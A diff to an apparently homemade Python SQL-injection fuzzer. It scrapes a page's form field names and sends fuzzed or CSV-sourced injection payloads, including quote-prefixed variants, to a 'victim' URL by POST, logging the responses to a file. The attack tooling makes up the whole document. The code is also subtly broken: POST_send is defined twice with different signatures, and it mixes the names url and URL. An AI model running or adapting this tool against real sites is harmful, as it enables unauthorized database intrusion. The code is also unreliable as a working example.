@@ -29,26 +29,35 @@ def POST_generator(url, fuzz_flag):
             found = re.findall(pattern, str(i))
             list_input_names.append(found[0][0])
         except:
-            print("no name found")
-    
+            print("No name field found.")
+
     for i in list_input_names:
 	#re.findall call looks for all name tags that satisfy the regex constraint
         form_inputs.append(re.findall(r'"(.*?)"',i)[0])
 
-    print(form_inputs)
+    if(len(form_inputs) > 2):
+        #here we're going to loop and keep sending injection attempts to the POST_send function
+        for n in range(len(form_inputs)):
+            if (n + 1 < len(form_inputs)):
+                if(fuzz_flag):
+                    #payload = pull_from_generator()
+                    payload = fuzz()
+                else:
+                    payload = pull_from_CSV()
+                for x,y in payload.items():
+                    print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
+                    POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
+                    POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
 
-    #here we're going to loop and keep sending injection attempts to the POST_send function
-    for n in range(len(form_inputs)):
-        if (n + 1 < len(form_inputs)):
+    else:
+        for n in range(len(form_inputs)):
             if(fuzz_flag):
-                #payload = pull_from_generator()
-                payload = fuzz()
+                    payload = fuzz()
             else:
                 payload = pull_from_CSV()
-            for x,y in payload.items():
-                print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
-                POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
-                POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
+                for x,y in payload.items():
+                    print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the form is: " + form_inputs[n])
+                    POST_send(URL, form_inputs[n], y)
 
 #Actually sends the POST request with the payload/information as specified 
 def POST_send(URL, username_field, password_field, username_input, password_input):
@@ -60,4 +69,16 @@ def POST_send(URL, username_field, password_field, username_input, password_inpu
     #temp test code to write to file
     file = open("hi.txt", "a")
     file.write("Hello this is the payload: " + username_input + "\n\n" + r.text + "\n\n")
+    print(r.status_code)
+
+#Actually sends the POST request with the payload/information as specified 
+def POST_send(URL, field, input):
+    
+    payload = {field: input}
+    victim = URL
+    r = requests.post(victim, payload)
+    
+    #temp test code to write to file
+    file = open("hi.txt", "a")
+    file.write("Hello this is the payload: " + input + "\n\n" + r.text + "\n\n")
     print(r.status_code)
